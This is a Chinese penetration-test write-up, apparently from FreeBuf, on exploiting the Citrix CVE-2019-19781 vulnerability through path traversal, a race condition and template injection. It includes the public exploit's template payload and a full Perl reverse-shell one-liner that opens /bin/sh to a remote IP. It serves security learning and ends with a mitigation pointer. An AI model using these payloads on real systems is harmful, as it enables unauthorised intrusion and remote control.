![](https://image.3001.net/images/20200216/1581853051_5e49297b7dd5f.jpg!small)

**去年底，Citrix高危漏洞CVE-2019-19781被披露，158多个国家的8万多家公司网络系统受其影响，面临严重安全风险，漏洞包含目录遍历和远程代码执行，攻击者若成功利用该漏洞，可在未授权情况下访问受害者公司内部网络，还可实现任意代码执行。而恰巧最近，我在一次安全评估中就遇到了该漏洞，分享于此，希望能对大家有用。**

CVE-2019-19781也被称为“Shitrix”，概括来看，它的漏洞利用机制用到了Citrix网关应用的模板处理过程，由于在创建模板的过程中，会调用到/vpn/../vpns/portal/scripts/newbm.pl下的脚本服务，为此，我们可以构造一些Perl
语言的模板命令形成Payload，并把它插入到一个XML文件中成为<xml_name>.xml。由于该XML中包含了我们的Payload，当对/vpn/../vpns/portal/<xml_name>.xml发起请求时，就会触发命令执行。

现在网络上有很多个公开的漏洞利用exploit，简单到只需给定目标IP点击一下回车键就能得到反弹shell实现攻击。但是，这些公开版的exploit貌似在我遇到的实际测试环境中都不怎么好用，所以接下来，我们就一起来探讨探讨。

##  漏洞测试

首先，我对目标设备发起了一个针对目录/vpn/../vpns/cfg/smb.conf的GET请求，可以成功响应，这说明目标设备是存在目录遍历漏洞的。

![](https://image.3001.net/images/20200216/1581853163_5e4929eb17507.png!small)好吧，接下来我们来测试RCE，于是我就直接把该漏洞[公开版本的bash命令行exploit](https://github.com/projectzeroindia/CVE-2019-19781)拿来利用，但是，结果提示不成功：

![](https://image.3001.net/images/20200216/1581853221_5e492a2583b7a.png!small)之后，我决定用Burp来观察一下具体的网络请求。首先，我们针对/vpn/../vpns/portal/scripts/newbm.pl发起POST请求，生成一个包含bookmark内容的XML文件。因为在调用newbm.pl服务和NSC_USER保存XML的时候都会用到目录遍历，之后，由于服务端成功响应“Bookmark
Added”成功，所以，这一步的目录遍历加Bookmark写入到test2.xml是成功的。

![](https://image.3001.net/images/20200216/1581853254_5e492a46e10fe.png!small)这里，我想到了两种分析方法：一是测试/vpn/目录的写权限，二是测试目标设备是否具备黑白名单。对于第一种测试，我的同事@edhx0建议可以对rmbm.pl发起请求，对rmbm.pl的请求作用是删除XML文件中Bookmark内容的，并不删除XML文件本身。发起对rmbm.pl请求后，我们再来看看test2.xml中的Bookmark内容：

![](https://image.3001.net/images/20200216/1581853281_5e492a61ac2e0.png!small)可以看到，其中的Bookmark内容已经被rmbm.pl删除了。这样看来，在newbm.pl作用下，我们具备了写权限。另外，当我在Bookmark参数title中写入了攻击Payload后，XML无法生成，但把title参数留空后，XML文件可以生成，这样看来目标设备中可能存在一个黑名单。

![](https://image.3001.net/images/20200216/1581853319_5e492a8731e4d.png!small)现在，我们能调用newbm.pl服务并把其中的title参数置空，这样就能成功实现XML文件的写入生成，而且RCE的漏洞利用也正是访问了其中的XML文件从而实现了代码执行。

bash版本的exploit用到的Payload命令如下：

    
    
    [%25+template.new({'BLOCK'%3d'exec(\'$2 | tee /netscaler/portal/templates/$filenameid.xml\')%3b'})+%25]

利用上述Payload在参数title处的构造，刚开始会出现“The requested page was not found on this
server”的错误响应，但经过反复的特殊字符删减测试，才会返回有效的XML文件。最终，我发现字符“BLOCK”是导致Payload无法成功执行的唯一原因，因此，我尝试对该字符进行多种方式的编码，并尝试用Perl
Template Toolkit对它进行执行，但请求最终成型的XML文件后，得到的却总是一个Perl代码运行的错误提示，如下解码后的信息是：perl
error - EVAL_PERL not set”。

![](https://image.3001.net/images/20200216/1581853361_5e492ab1c7a2e.png!small)有点奇怪，XML可写，且具备Perl运行环境，那是不是XML文件或其中的某些字符又被删除了呢？但如果是这样，我能否利用条件竞争方式（Race
Condition），即在XML被过滤之前实现对其的访问。比如，我可以同时对XML文件发起50个并发请求，与此同时也可在其中发起Bookmark的创建请求，希望这50个请求中能有一个请求能成功命中XML文件，最终就能触发其中的Payload执行了。比如，在下图的Payload中，我在title参数中写入了ns.conf的配置文件读取，并把最终读取内容输出到了test2.xml文件中，方便最终的运行显示。

![](https://image.3001.net/images/20200216/1581853410_5e492ae2aaeac.png!small)接下来，我就用Burp
Intruder来实现50个请求并发，结果超出我的预想，某些请求竟然能成功实现响应，也就是我们的条件竞争方式（Race Condition）是可行的！

![](https://image.3001.net/images/20200216/1581853479_5e492b273d46a.png!small)

现在，最后需要考虑的就是反弹shell了。由于测试的目标Citrix设备应用中未安装有python或netcat，需要涉及到>、&或双引号等特殊字符，那么一些典型的反弹shell样式Payload也就无从谈起了。参照[这里的Perl反弹shell构造方式](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)，我采用了以下构造方法：

    
    
    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

之后，我把上述Payload转换成了包含chr()方法的eval形式编码，并进行了一些编码替换，如下：

![](https://image.3001.net/images/20200216/1581853509_5e492b451985b.png!small)最终，经过编码转化的Payload可成功插入到Perl
Template中，看着有些冗长奇怪：

![](https://image.3001.net/images/20200216/1581853525_5e492b550f803.png!small)好在，使用之前的条件竞争方式（Race
Condition）后，最后我得到了有效的反弹shell，如下：

![](https://image.3001.net/images/20200216/1581853573_5e492b85c9219.png!small)

##  后续

两天之后，我的同事0xedh告诉我火眼FireEye发布了[一篇文章披露了恶意软件NOTROBIN在利用CVE-2019-19781漏洞进行入侵感染](https://www.fireeye.com/blog/threat-research/2020/01/vigilante-deploying-mitigation-for-citrix-netscaler-vulnerability-while-maintaining-backdoor.html)后，会删除其他攻击者上传的包含“BLOCK”字符的XML文件，形成对目标Citrix设备的独有后门控制。哇，原来是这样啊！怪不得我之前遇到的就是这种情况，原来是Citrix测试设备已经被攻击者用恶意软件NOTROBIN控制了。以下即为Citrix测试设备中NOTROBIN的后门进程：

![](https://image.3001.net/images/20200216/1581853616_5e492bb0f2e3b.png!small)

##  漏洞修复

对于 Citrix 用户来说，可以参照 [Citrix
官方发布的缓解措施](https://support.citrix.com/article/CTX267679)进行修复。对于红队测试者来说，若利用该漏洞对目标Citrix应用进行授权测试时，如果请求构造XML文件时遇到“The
requested page was not found on this
server”的情况，那么可以考虑本文的“目录遍历+条件竞争+文件写入+命令执行“方式（Path Traversal + Race Condition +
File Write + Command
Execution”）去测试获得反弹shell，当然，也需要考虑目标Citrix应用是否已经被其他攻击者用NOTROBIN恶意软件感染控制的可能。

***参考来源：[crummie5](https://www.crummie5.club/pwning-a-pwned-citrix/)，clouds
编译整理，转载请注明来自 FreeBuf.COM **

  

